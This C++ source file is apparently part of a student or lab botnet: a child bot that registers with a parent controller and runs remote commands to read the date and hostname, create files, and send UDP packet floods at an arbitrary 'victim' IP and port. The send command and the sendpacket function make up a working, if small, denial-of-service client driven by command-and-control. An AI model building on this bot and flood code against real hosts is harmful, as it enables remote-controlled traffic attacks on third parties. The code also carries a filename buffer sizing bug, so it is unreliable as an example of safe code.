#include "child-bot.h"
#include <time.h>
#include <fstream>

Child::Child(int id, int port): Bot(id, port) {
	pthread_t thread;
	conn_info *c;
	stringstream sstm;

	parent_ = connect_ (SPORT(id_));

	c = (conn_info *)malloc(sizeof(conn_info));
	c->bot = this;
	c->sfd = parent_;
	pthread_create(&thread, NULL, &utility::waitCmd, (void *)c);
	
	// construct report msg
	sstm << "report " << id_ << endl;
	sendmsg(parent_, sstm.str().c_str());
}

Child::~Child(){
	close (parent_);
}

void Child::command(int argc, char **argv, int src_fd){
	//for(int i=0; i<argc; ++i)
	//	cout << argv[i] << " ";
	//cout << endl;
	if (argc == 1){
		if(strcmp(argv[0],"kill") == 0){
			alive_ = false;
			return;
		}else if(strcmp(argv[0],"read-date") == 0){
			stringstream sstm;
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[100];
			strftime(s, sizeof(s), "%a %b %d %X %Z %Y", tm);						

			sstm << "res-rd " << id_ << " " << s << endl;
			sendmsg(src_fd, sstm.str().c_str());
			return;
		}else if(strcmp(argv[0], "read-host") == 0){
			stringstream sstm;
			char s[100];

			gethostname(s, 100);
			sstm << "res-rh " << id_ << " " << s << endl;
			sendmsg(src_fd, sstm.str().c_str());
			return;
		}
	}

	if (argc == 2){
		if(strcmp(argv[0],"create") == 0){
			char *path = argv[1];
			int len = strlen(path)+4;
			char *new_path = (char *)malloc(len);
			ofstream o;
		
			snprintf(new_path, len, "%s_%d",path,id_);
			o.open(new_path);

			if(o.fail()){
				stringstream sstm;

				sstm << "res-create " << id_ << " " << new_path << " fail" << endl;
				sendmsg(src_fd, sstm.str().c_str());
			}else{
				stringstream sstm;

				o << "Hello Bots!" << endl;
				o.close();
				sstm << "res-create " << id_ << " " << new_path << " OK" << endl;
				sendmsg(src_fd, sstm.str().c_str());
			}

			free(new_path);	
			return;
		}
	}

	if (argc == 3){
		if(strcmp(argv[0],"send") == 0){
			stringstream sstm;
			int npacket = atoi(argv[1]);
			char *ip;
			char *port_;
			int port;
			int n = 0;

			ip = strtok(argv[2],":");
			port_ = strtok(NULL,":");
			if(port_)
				port = atoi(port_);
			else
				port = (rand()%16383) + 49152;

			for(int i=0; i<npacket; ++i){
				n += sendpacket(ip, port);
				usleep(10000);
			}

			sstm << "res-send " << id_ << " " << n << " " << ip << ":" << port << endl;
			sendmsg(src_fd, sstm.str().c_str()); 
			return;
		}
	}

	return;	
}

int Child::sendpacket(char *ip, int port){
	struct sockaddr_in victim;
	int s;
	int n;

	char data[] = "abcd";

	if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return 0;

	memset((char *)&victim, 0, sizeof(victim));

	victim.sin_family = AF_INET;
	victim.sin_addr.s_addr = inet_addr(ip);
	victim.sin_port = htons(port);

	n = sendto(s, data, strlen(data), 0, (struct sockaddr*) &victim, sizeof(struct sockaddr_in));

	if (n <= 0)
		return 0;
	
	return 1;
}

int main (int argc, char **argv){
	Child *child = new Child(atoi(argv[1]), atoi(argv[2]));
	while(child->isAlive()) { }	
	return 0;
}
